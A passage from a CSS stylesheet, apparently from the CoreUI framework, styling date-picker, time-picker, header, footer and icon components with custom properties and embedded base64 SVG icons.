                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwYXRoIGZpbGw9JyMyZWI4NWMnIGQ9J000NzIsOTZIMzg0VjQwSDM1MlY5NkgxNjBWNDBIMTI4Vjk2SDQwYTI0LjAyOCwyNC4wMjgsMCwwLDAtMjQsMjRWNDU2YTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQsMjRINDcyYTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQtMjRWMTIwQTI0LjAyOCwyNC4wMjgsMCwwLDAsNDcyLDk2Wm0tOCwzNTJINDhWMTI4aDgwdjQwaDMyVjEyOEgzNTJ2NDBoMzJWMTI4aDgwWic+PC9wYXRoPjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMTEyJyB5PScyMjQnIGZpbGw9JyMyZWI4NWMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzIwMCcgeT0nMjI0JyBmaWxsPScjMmViODVjJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyODAnIHk9JzIyNCcgZmlsbD0nIzJlYjg1Yyc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMzY4JyB5PScyMjQnIGZpbGw9JyMyZWI4NWMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzExMicgeT0nMjk2JyBmaWxsPScjMmViODVjJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyMDAnIHk9JzI5NicgZmlsbD0nIzJlYjg1Yyc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjgwJyB5PScyOTYnIGZpbGw9JyMyZWI4NWMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzM2OCcgeT0nMjk2JyBmaWxsPScjMmViODVjJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScxMTInIHk9JzM2OCcgZmlsbD0nIzJlYjg1Yyc+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjAwJyB5PSczNjgnIGZpbGw9JyMyZWI4NWMnPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzI4MCcgeT0nMzY4JyBmaWxsPScjMmViODVjJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PSczNjgnIHk9JzM2OCcgZmlsbD0nIzJlYjg1Yyc+PC9yZWN0Pjwvc3ZnPg==);
            }
            .date-picker-body {
                display: grid;
                grid-template-areas: "ranges calendars" "ranges timepickers";
                grid-template-rows: auto;
                grid-template-columns: auto auto;
            }
            .date-picker-ranges {
                grid-area: ranges;
                width: var(--cui-date-picker-ranges-width);
                padding: var(--cui-date-picker-ranges-padding);
                border-right: var(--cui-date-picker-ranges-border);
            }
            .date-picker-calendars {
                display: flex;
                grid-area: calendars;
            }
            .date-picker-calendars .date-picker-calendar:not(:last-child) .calendar-navigation-next {
                visibility: hidden;
            }
            .date-picker-calendars .date-picker-calendar:not(:first-child) .calendar-navigation-prev {
                visibility: hidden;
            }
            html:not([dir="rtl"]) .date-picker-arrow-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMzU5Ljg3MyAxMjEuMzc3IDMzNy4yNDYgMTQ0LjAwNCA0MzMuMjQzIDI0MC4wMDEgMTYgMjQwLjAwMSAxNiAyNDAuMDAyIDE2IDI3Mi4wMDEgMTYgMjcyLjAwMiA0MzMuMjQgMjcyLjAwMiAzMzcuMjQ2IDM2Ny45OTYgMzU5Ljg3MyAzOTAuNjIzIDQ5NC40OTggMjU2IDM1OS44NzMgMTIxLjM3Nyc+PC9wb2x5Z29uPjwvc3ZnPg==);
            }
            *[dir="rtl"] .date-picker-arrow-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nNDk3LjMzMyAyMzkuOTk5IDgwLjA5MiAyMzkuOTk5IDE3Ni4wODcgMTQ0LjAwNCAxNTMuNDYgMTIxLjM3NyAxOC44MzcgMjU2IDE1My40NiAzOTAuNjIzIDE3Ni4wODcgMzY3Ljk5NiA4MC4wOSAyNzEuOTk5IDQ5Ny4zMzMgMjcxLjk5OSA0OTcuMzMzIDIzOS45OTknPjwvcG9seWdvbj48L3N2Zz4=);
            }
            .date-picker-cleaner-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMzA2LjkxMiAyMTQuNDYxIDI1NiAyNjUuMzczIDIwNS4wODggMjE0LjQ2MSAxODIuNDYxIDIzNy4wODggMjMzLjM3MyAyODggMTgyLjQ2MSAzMzguOTEyIDIwNS4wODggMzYxLjUzOSAyNTYgMzEwLjYyNyAzMDYuOTEyIDM2MS41MzkgMzI5LjUzOSAzMzguOTEyIDI3OC42MjcgMjg4IDMyOS41MzkgMjM3LjA4OCAzMDYuOTEyIDIxNC40NjEnPjwvcG9seWdvbj48cGF0aCBmaWxsPScjOGE5M2EyJyBkPSdNNDcyLDk2SDM4NFY0MEgzNTJWOTZIMTYwVjQwSDEyOFY5Nkg0MGEyNC4wMjgsMjQuMDI4LDAsMCwwLTI0LDI0VjQ1NmEyNC4wMjgsMjQuMDI4LDAsMCwwLDI0LDI0SDQ3MmEyNC4wMjgsMjQuMDI4LDAsMCwwLDI0LTI0VjEyMEEyNC4wMjgsMjQuMDI4LDAsMCwwLDQ3Miw5NlptLTgsMzUySDQ4VjEyOGg4MHY0MGgzMlYxMjhIMzUydjQwaDMyVjEyOGg4MFonPjwvcGF0aD48L3N2Zz4=);
            }
            .date-picker-cleaner-icon:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMzA2LjkxMiAyMTQuNDYxIDI1NiAyNjUuMzczIDIwNS4wODggMjE0LjQ2MSAxODIuNDYxIDIzNy4wODggMjMzLjM3MyAyODggMTgyLjQ2MSAzMzguOTEyIDIwNS4wODggMzYxLjUzOSAyNTYgMzEwLjYyNyAzMDYuOTEyIDM2MS41MzkgMzI5LjUzOSAzMzguOTEyIDI3OC42MjcgMjg4IDMyOS41MzkgMjM3LjA4OCAzMDYuOTEyIDIxNC40NjEnPjwvcG9seWdvbj48cGF0aCBmaWxsPSdyZ2JhKDQ0LCA1NiwgNzQsIDAuOTUpKScgZD0nTTQ3Miw5NkgzODRWNDBIMzUyVjk2SDE2MFY0MEgxMjhWOTZINDBhMjQuMDI4LDI0LjAyOCwwLDAsMC0yNCwyNFY0NTZhMjQuMDI4LDI0LjAyOCwwLDAsMCwyNCwyNEg0NzJhMjQuMDI4LDI0LjAyOCwwLDAsMCwyNC0yNFYxMjBBMjQuMDI4LDI0LjAyOCwwLDAsMCw0NzIsOTZabS04LDM1Mkg0OFYxMjhoODB2NDBoMzJWMTI4SDM1MnY0MGgzMlYxMjhoODBaJz48L3BhdGg+PC9zdmc+);
            }
            .date-picker-input-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwYXRoIGZpbGw9JyM4YTkzYTInIGQ9J000NzIsOTZIMzg0VjQwSDM1MlY5NkgxNjBWNDBIMTI4Vjk2SDQwYTI0LjAyOCwyNC4wMjgsMCwwLDAtMjQsMjRWNDU2YTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQsMjRINDcyYTI0LjAyOCwyNC4wMjgsMCwwLDAsMjQtMjRWMTIwQTI0LjAyOCwyNC4wMjgsMCwwLDAsNDcyLDk2Wm0tOCwzNTJINDhWMTI4aDgwdjQwaDMyVjEyOEgzNTJ2NDBoMzJWMTI4aDgwWic+PC9wYXRoPjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMTEyJyB5PScyMjQnIGZpbGw9JyM4YTkzYTInPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzIwMCcgeT0nMjI0JyBmaWxsPScjOGE5M2EyJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyODAnIHk9JzIyNCcgZmlsbD0nIzhhOTNhMic+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMzY4JyB5PScyMjQnIGZpbGw9JyM4YTkzYTInPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzExMicgeT0nMjk2JyBmaWxsPScjOGE5M2EyJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScyMDAnIHk9JzI5NicgZmlsbD0nIzhhOTNhMic+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjgwJyB5PScyOTYnIGZpbGw9JyM4YTkzYTInPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzM2OCcgeT0nMjk2JyBmaWxsPScjOGE5M2EyJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PScxMTInIHk9JzM2OCcgZmlsbD0nIzhhOTNhMic+PC9yZWN0PjxyZWN0IHdpZHRoPSczMicgaGVpZ2h0PSczMicgeD0nMjAwJyB5PSczNjgnIGZpbGw9JyM4YTkzYTInPjwvcmVjdD48cmVjdCB3aWR0aD0nMzInIGhlaWdodD0nMzInIHg9JzI4MCcgeT0nMzY4JyBmaWxsPScjOGE5M2EyJz48L3JlY3Q+PHJlY3Qgd2lkdGg9JzMyJyBoZWlnaHQ9JzMyJyB4PSczNjgnIHk9JzM2OCcgZmlsbD0nIzhhOTNhMic+PC9yZWN0Pjwvc3ZnPg==);
            }
            .date-picker-timepickers {
                display: flex;
                flex-wrap: wrap;
                grid-area: timepickers;
                justify-content: space-between;
                border-top: var(--cui-date-picker-timepicker-border-top);
            }
            .date-picker-timepickers .time-picker {
                width: var(--cui-date-picker-timepicker-width);
            }
            .date-picker-timepickers .time-picker .form-select {
                width: initial;
                padding-right: 0.25rem !important;
                padding-left: 0.25rem !important;
                text-align: right;
                background-image: none !important;
                border: 0;
            }
            .date-picker-timepickers .time-picker .form-select:disabled {
                color: rgba(44, 56, 74, 0.38);
                background-color: transparent;
            }
            @media (max-width: 767.98px) {
                .date-picker-timepickers {
                    display: block;
                }
                .date-picker-timepickers .time-picker {
                    width: 100%;
                }
                .date-picker-timepickers .time-picker + .time-picker {
                    border-top: var(--cui-date-picker-timepicker-border-top);
                }
            }
            .time-picker {
                --cui-time-picker-body-padding: 0.5rem;
                --cui-time-picker-roll-col-border: 1px solid #d8dbe0;
            }
            .time-picker.is-invalid .form-control {
                --cui-input-border-color: #e55353;
            }
            .time-picker.is-invalid .input-group-text {
                --cui-input-group-addon-border-color: #e55353;
            }
            .time-picker.is-invalid .picker-input-group-indicator {
                --cui-input-group-addon-color: #e55353;
            }
            .time-picker.is-invalid .time-picker-input-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyNlNTUzNTMnIHBvaW50cz0nMjcxLjUxNCA5NS41IDIzOS41MTQgOTUuNSAyMzkuNTE0IDI3My42MTEgMzU1LjEyNyAzMjguNTU5IDM2OC44NjQgMjk5LjY1NyAyNzEuNTE0IDI1My4zODkgMjcxLjUxNCA5NS41JyBjbGFzcz0nY2ktcHJpbWFyeSc+PC9wb2x5Z29uPjxwYXRoIGZpbGw9JyNlNTUzNTMnIGQ9J00yNTYsMTZDMTIzLjQ1MiwxNiwxNiwxMjMuNDUyLDE2LDI1NlMxMjMuNDUyLDQ5NiwyNTYsNDk2LDQ5NiwzODguNTQ4LDQ5NiwyNTYsMzg4LjU0OCwxNiwyNTYsMTZabTAsNDQ4QzE0MS4xMjUsNDY0LDQ4LDM3MC44NzUsNDgsMjU2UzE0MS4xMjUsNDgsMjU2LDQ4czIwOCw5My4xMjUsMjA4LDIwOFMzNzAuODc1LDQ2NCwyNTYsNDY0WicgY2xhc3M9J2NpLXByaW1hcnknPjwvcGF0aD48L3N2Zz4=);
            }
            .time-picker.is-valid .form-control {
                --cui-input-border-color: #2eb85c;
            }
            .time-picker.is-valid .input-group-text {
                --cui-input-group-addon-border-color: #2eb85c;
            }
            .time-picker.is-valid .picker-input-group-indicator {
                --cui-input-group-addon-color: #2eb85c;
            }
            .time-picker.is-valid .time-picker-input-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyMyZWI4NWMnIHBvaW50cz0nMjcxLjUxNCA5NS41IDIzOS41MTQgOTUuNSAyMzkuNTE0IDI3My42MTEgMzU1LjEyNyAzMjguNTU5IDM2OC44NjQgMjk5LjY1NyAyNzEuNTE0IDI1My4zODkgMjcxLjUxNCA5NS41JyBjbGFzcz0nY2ktcHJpbWFyeSc+PC9wb2x5Z29uPjxwYXRoIGZpbGw9JyMyZWI4NWMnIGQ9J00yNTYsMTZDMTIzLjQ1MiwxNiwxNiwxMjMuNDUyLDE2LDI1NlMxMjMuNDUyLDQ5NiwyNTYsNDk2LDQ5NiwzODguNTQ4LDQ5NiwyNTYsMzg4LjU0OCwxNiwyNTYsMTZabTAsNDQ4QzE0MS4xMjUsNDY0LDQ4LDM3MC44NzUsNDgsMjU2UzE0MS4xMjUsNDgsMjU2LDQ4czIwOCw5My4xMjUsMjA4LDIwOFMzNzAuODc1LDQ2NCwyNTYsNDY0WicgY2xhc3M9J2NpLXByaW1hcnknPjwvcGF0aD48L3N2Zz4=);
            }
            .time-picker-body {
                display: flex;
                align-items: center;
                padding: var(--cui-time-picker-body-padding);
            }
            .time-picker-body .form-select {
                padding-right: 1.25rem;
                background-position: right 0.5rem center;
                -ms-overflow-style: none;
                scrollbar-width: none;
            }
            .time-picker-body .form-select + .form-select {
                margin-left: 0.5rem;
            }
            .time-picker-body .form-select::-webkit-scrollbar {
                width: 10px;
            }
            .time-picker-body .time-picker-inline-icon {
                display: block;
                width: 40px;
                height: 1.25rem;
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMjcxLjUxNCA5NS41IDIzOS41MTQgOTUuNSAyMzkuNTE0IDI3My42MTEgMzU1LjEyNyAzMjguNTU5IDM2OC44NjQgMjk5LjY1NyAyNzEuNTE0IDI1My4zODkgMjcxLjUxNCA5NS41JyBjbGFzcz0nY2ktcHJpbWFyeSc+PC9wb2x5Z29uPjxwYXRoIGZpbGw9JyM4YTkzYTInIGQ9J00yNTYsMTZDMTIzLjQ1MiwxNiwxNiwxMjMuNDUyLDE2LDI1NlMxMjMuNDUyLDQ5NiwyNTYsNDk2LDQ5NiwzODguNTQ4LDQ5NiwyNTYsMzg4LjU0OCwxNiwyNTYsMTZabTAsNDQ4QzE0MS4xMjUsNDY0LDQ4LDM3MC44NzUsNDgsMjU2UzE0MS4xMjUsNDgsMjU2LDQ4czIwOCw5My4xMjUsMjA4LDIwOFMzNzAuODc1LDQ2NCwyNTYsNDY0WicgY2xhc3M9J2NpLXByaW1hcnknPjwvcGF0aD48L3N2Zz4=);
                background-repeat: no-repeat;
                background-position: center;
            }
            .time-picker-cleaner-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMzQ4LjA3MSAxNDEuMzAyIDI2MC4zMDggMjI5LjA2NSAxNzIuNTQ1IDE0MS4zMDIgMTQ5LjkxNyAxNjMuOTI5IDIzNy42ODEgMjUxLjY5MiAxNDkuOTE3IDMzOS40NTYgMTcyLjU0NSAzNjIuMDgzIDI2MC4zMDggMjc0LjMyIDM0OC4wNzEgMzYyLjA4MyAzNzAuNjk5IDMzOS40NTYgMjgyLjkzNSAyNTEuNjkyIDM3MC42OTkgMTYzLjkyOSAzNDguMDcxIDE0MS4zMDInIGNsYXNzPSdjaS1wcmltYXJ5Jz48L3BvbHlnb24+PHBhdGggZmlsbD0nIzhhOTNhMicgZD0nTTQyNS43MDYsODYuMjk0QTI0MCwyNDAsMCwwLDAsODYuMjk0LDQyNS43MDYsMjQwLDI0MCwwLDAsMCw0MjUuNzA2LDg2LjI5NFpNMjU2LDQ2NEMxNDEuMzA5LDQ2NCw0OCwzNzAuNjkxLDQ4LDI1NlMxNDEuMzA5LDQ4LDI1Niw0OHMyMDgsOTMuMzA5LDIwOCwyMDhTMzcwLjY5MSw0NjQsMjU2LDQ2NFonIGNsYXNzPSdjaS1wcmltYXJ5Jz48L3BhdGg+PC9zdmc+);
            }
            .time-picker-cleaner-icon:hover {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9J3JnYmEoNDQsIDU2LCA3NCwgMC45NSknIHBvaW50cz0nMzQ4LjA3MSAxNDEuMzAyIDI2MC4zMDggMjI5LjA2NSAxNzIuNTQ1IDE0MS4zMDIgMTQ5LjkxNyAxNjMuOTI5IDIzNy42ODEgMjUxLjY5MiAxNDkuOTE3IDMzOS40NTYgMTcyLjU0NSAzNjIuMDgzIDI2MC4zMDggMjc0LjMyIDM0OC4wNzEgMzYyLjA4MyAzNzAuNjk5IDMzOS40NTYgMjgyLjkzNSAyNTEuNjkyIDM3MC42OTkgMTYzLjkyOSAzNDguMDcxIDE0MS4zMDInIGNsYXNzPSdjaS1wcmltYXJ5Jz48L3BvbHlnb24+PHBhdGggZmlsbD0ncmdiYSg0NCwgNTYsIDc0LCAwLjk1KScgZD0nTTQyNS43MDYsODYuMjk0QTI0MCwyNDAsMCwwLDAsODYuMjk0LDQyNS43MDYsMjQwLDI0MCwwLDAsMCw0MjUuNzA2LDg2LjI5NFpNMjU2LDQ2NEMxNDEuMzA5LDQ2NCw0OCwzNzAuNjkxLDQ4LDI1NlMxNDEuMzA5LDQ4LDI1Niw0OHMyMDgsOTMuMzA5LDIwOCwyMDhTMzcwLjY5MSw0NjQsMjU2LDQ2NFonIGNsYXNzPSdjaS1wcmltYXJ5Jz48L3BhdGg+PC9zdmc+);
            }
            .time-picker-input-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCA1MTIgNTEyJyByb2xlPSdpbWcnPjxwb2x5Z29uIGZpbGw9JyM4YTkzYTInIHBvaW50cz0nMjcxLjUxNCA5NS41IDIzOS41MTQgOTUuNSAyMzkuNTE0IDI3My42MTEgMzU1LjEyNyAzMjguNTU5IDM2OC44NjQgMjk5LjY1NyAyNzEuNTE0IDI1My4zODkgMjcxLjUxNCA5NS41JyBjbGFzcz0nY2ktcHJpbWFyeSc+PC9wb2x5Z29uPjxwYXRoIGZpbGw9JyM4YTkzYTInIGQ9J00yNTYsMTZDMTIzLjQ1MiwxNiwxNiwxMjMuNDUyLDE2LDI1NlMxMjMuNDUyLDQ5NiwyNTYsNDk2LDQ5NiwzODguNTQ4LDQ5NiwyNTYsMzg4LjU0OCwxNiwyNTYsMTZabTAsNDQ4QzE0MS4xMjUsNDY0LDQ4LDM3MC44NzUsNDgsMjU2UzE0MS4xMjUsNDgsMjU2LDQ4czIwOCw5My4xMjUsMjA4LDIwOFMzNzAuODc1LDQ2NCwyNTYsNDY0WicgY2xhc3M9J2NpLXByaW1hcnknPjwvcGF0aD48L3N2Zz4=);
            }
            .time-picker-roll {
                padding: 0;
                overflow: hidden;
                border-radius: inherit;
            }
            .time-picker-roll-col {
                height: 256px;
                overflow: scroll;
                border-right: var(--cui-time-picker-roll-col-border);
                -ms-overflow-style: none;
                scrollbar-width: none;
            }
            .time-picker-roll-col::-webkit-scrollbar {
                display: none;
            }
            .time-picker-roll-cell {
                width: 50px;
                height: 32px;
                padding: 0 1rem 0 0.5rem;
                line-height: 32px;
            }
            .time-picker-roll-cell.selected {
                color: var(--cui-white);
                background: var(--cui-primary);
            }
            .time-picker-roll-cell:last-child::after {
                display: block;
                height: 224px;
                content: "";
            }
            .footer {
                --cui-footer-min-height: 3rem;
                --cui-footer-padding-x: 1rem;
                --cui-footer-padding-y: 0.5rem;
                --cui-footer-color: rgba(44, 56, 74, 0.95);
                --cui-footer-bg: #ebedef;
                --cui-footer-border-color: #d8dbe0;
                --cui-footer-border: 1px solid var(--cui-footer-border-color);
                display: flex;
                flex-wrap: wrap;
                align-items: center;
                justify-content: space-between;
                min-height: var(--cui-footer-min-height);
                padding: var(--cui-footer-padding-y) var(--cui-footer-padding-x);
                color: var(--cui-footer-color);
                background: var(--cui-footer-bg);
                border-top: var(--cui-footer-border);
            }
            .footer-sticky {
                position: -webkit-sticky;
                position: sticky;
                bottom: 0;
                z-index: 1030;
            }
            .footer-sticky:not(.placeholder):not(top) {
                border-color: transparent;
                box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .header {
                --cui-header-min-height: 4rem;
                --cui-header-padding-x: 0.5rem;
                --cui-header-padding-y: 0.5rem;
                --cui-header-bg: #fff;
                --cui-header-color: rgba(44, 56, 74, 0.681);
                --cui-header-border-color: #d8dbe0;
                --cui-header-border: 1px solid var(--cui-header-border-color);
                --cui-header-hover-color: rgba(44, 56, 74, 0.95);
                --cui-header-disabled-color: rgba(44, 56, 74, 0.38);
                --cui-header-active-color: rgba(44, 56, 74, 0.95);
                --cui-header-brand-padding-y: 0.3125rem;
                --cui-header-brand-color: #4f5d73;
                --cui-header-brand-hover-color: #475468;
                --cui-header-toggler-padding-x: 0.75rem;
                --cui-header-toggler-padding-y: 0.25rem;
                --cui-header-toggler-bg: transparent;
                --cui-header-toggler-color: rgba(44, 56, 74, 0.681);
                --cui-header-toggler-border-radius: 0.375rem;
                --cui-header-toggler-hover-color: rgba(44, 56, 74, 0.95);
                --cui-header-toggler-icon-bg: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba%2844, 56, 74, 0.681%29' stroke-width='2.25' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
                --cui-header-toggler-hover-icon-bg: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba%2844, 56, 74, 0.95%29' stroke-width='2.25' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
                --cui-header-nav-link-padding-x: 0.5rem;
                --cui-header-nav-link-padding-y: 0.5rem;
                --cui-header-divider-border-color: #d8dbe0;
                --cui-header-divider-border: 1px solid var(--cui-header-divider-border-color);
                --cui-subheader-min-height: 3rem;
                position: relative;
                display: flex;
                flex-wrap: wrap;
                align-items: center;
                justify-content: space-between;
                min-height: var(--cui-header-min-height);
                padding: var(--cui-header-padding-y) var(--cui-header-padding-x);
                background: var(--cui-header-bg);
                border-bottom: var(--cui-header-border);
            }
            .header > .container,
            .header > .container-fluid,
            .header > .container-sm,
            .header > .container-md,
            .header > .container-lg,
            .header > .container-xl,
            .header > .container-xxl,
            .header .navbar > .container,
            .header .navbar > .container-fluid,
            .header .navbar > .container-sm,
            .header .navbar > .container-md,
            .header .navbar > .container-lg,
            .header .navbar > .container-xl,
            .header .navbar > .container-xxl {
                display: flex;
                flex-wrap: inherit;
                align-items: center;
                justify-content: space-between;
            }
            .header .container:first-child,
            .header .container-fluid:first-child,
            .header .container-sm:first-child,
            .header .container-md:first-child,
            .header .container-lg:first-child,
            .header .container-xl:first-child,
            .header .container-xxl:first-child {
                min-height: calc(var(--cui-header-min-height) - 2 * var(--cui-header-padding-y));
            }
            .header .container:nth-child(n + 2),
            .header .container-fluid:nth-child(n + 2),
            .header .container-sm:nth-child(n + 2),
            .header .container-md:nth-child(n + 2),
            .header .container-lg:nth-child(n + 2),
            .header .container-xl:nth-child(n + 2),
            .header .container-xxl:nth-child(n + 2) {
                min-height: calc(var(--cui-subheader-min-height) - 2 * var(--cui-header-padding-y));
            }
            .header.header-sticky {
                position: -webkit-sticky;
                position: sticky;
                top: 0;
                z-index: 1029;
                box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .header.header-sticky:not([class*="border"]) {
                border: 0;
            }
            .header-divider {
                flex-basis: calc(100% + 2 * var(--cui-header-padding-x));
                height: 0;
                margin: var(--cui-header-padding-y) calc(var(--cui-header-padding-x) * -1);
                border-top: var(--cui-header-divider-border);
            }
            .header-brand {
                padding-top: var(--cui-header-brand-padding-y);
                padding-bottom: var(--cui-header-brand-padding-y);
                font-size: 1.25rem;
                color: var(--cui-header-brand-color);
                text-decoration: none;
                white-space: nowrap;
            }
            html:not([dir="rtl"]) .header-brand {
                margin-right: 1rem;
            }
            *[dir="rtl"] .header-brand {
                margin-left: 1rem;
            }
            .header-brand:hover,
            .header-brand:focus {
                color: var(--cui-header-brand-hover-color);
            }
            .header-nav {
                display: flex;
                flex-direction: row;
                margin-bottom: 0;
                list-style: none;
            }
            html:not([dir="rtl"]) .header-nav {
                padding-left: 0;
            }
            *[dir="rtl"] .header-nav {
                padding-right: 0;
            }
            .header-nav .nav-link {
                padding: var(--cui-header-nav-link-padding-y) var(--cui-header-nav-link-padding-x);
                color: var(--cui-header-color);
            }
            .header-nav .nav-link:hover,
            .header-nav .nav-link:focus {
                color: var(--cui-header-hover-color);
            }
            .header-nav .nav-link.disabled {
                color: var(--cui-header-disabled-color);
            }
            .header-nav .show > .nav-link,
            .header-nav .nav-link.active {
                color: var(--cui-header-active-color);
            }
            .header-nav .dropdown-menu {
                position: absolute;
            }
            .header-text {
                padding-top: var(--cui-header-nav-link-padding-y);
                padding-bottom: var(--cui-header-nav-link-padding-y);
                color: var(--cui-header-color);
            }
            .header-text a {
                color: var(--cui-header-active-color);
            }
            .header-text a:hover,
            .header-text a:focus {
                color: var(--cui-header-active-color);
            }
            .header-toggler {
                padding: var(--cui-header-toggler-padding-y) var(--cui-header-toggler-padding-x);
                font-size: 1.25rem;
                color: var(--cui-header-toggler-color);
                background-color: var(--cui-header-toggler-bg);
                border: 0;
                border-radius: var(--cui-header-toggler-border-radius);
            }
            .header-toggler:hover {
                color: var(--cui-header-toggler-hover-color);
                text-decoration: none;
            }
            .header-toggler:focus {
                outline: 0;
            }
            .header-toggler:not(:disabled) {
                cursor: pointer;
            }
            .header-toggler.prevent-hide {
                display: block !important;
            }
            .header-toggler-icon {
                display: block;
                height: 1.5625rem;
                background-image: var(--cui-header-toggler-icon-bg);
                background-repeat: no-repeat;
                background-position: center center;
                background-size: 100% 100%;
            }
            .header-toggler-icon:hover {
                background-image: var(--cui-header-toggler-hover-icon-bg);
            }
            .icon {
                display: inline-block;
                color: inherit;
                text-align: center;
                vertical-align: -0.125rem;
                fill: currentcolor;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size) {
                width: 1rem;
                height: 1rem;
                font-size: 1rem;
            }
            .icon:not(.icon-c-s):not(.icon-custom-size).icon-xxl {
                width: 2rem;
                height: 2rem;
